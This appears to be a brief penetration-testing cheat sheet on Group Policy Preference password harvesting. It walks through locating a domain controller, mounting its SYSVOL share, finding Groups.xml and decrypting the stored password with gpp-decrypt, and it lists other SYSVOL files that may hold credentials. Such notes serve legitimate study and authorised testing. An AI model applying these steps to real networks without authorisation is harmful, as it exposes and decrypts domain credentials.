## Group Policy Preference

### Basic Steps to take

#### recon

First we need to map/mount that drive. In order to do that we need to know the IP-address of the domain controller. We can just look in the environment-variables

```
- Output environment-variables
set

- Look for the following:
LOGONSERVER=\\NAMEOFSERVER
USERDNSDOMAIN=WHATEVER.LOCAL

- Look up ip-addres
nslookup nameofserver.whatever.local

- It will output something like this
Address:  192.168.1.101

- Now we mount it
net use z: \\192.168.1.101\SYSVOL

- And enter it
z:

- Now we search for the groups.xml file
dir Groups.xml /s
```

In kali we can decrypt the password with following command

```
gpp-decrypt <encryptedpassword>
```

**Interesting files in share**
```
Services\Services.xml: Element-Specific Attributes
ScheduledTasks\ScheduledTasks.xml: Task Inner Element, TaskV2 Inner Element, ImmediateTaskV2 Inner Element
Printers\Printers.xml: SharedPrinter Element
Drives\Drives.xml: Element-Specific Attributes
DataSources\DataSources.xml: Element-Specific Attributes
```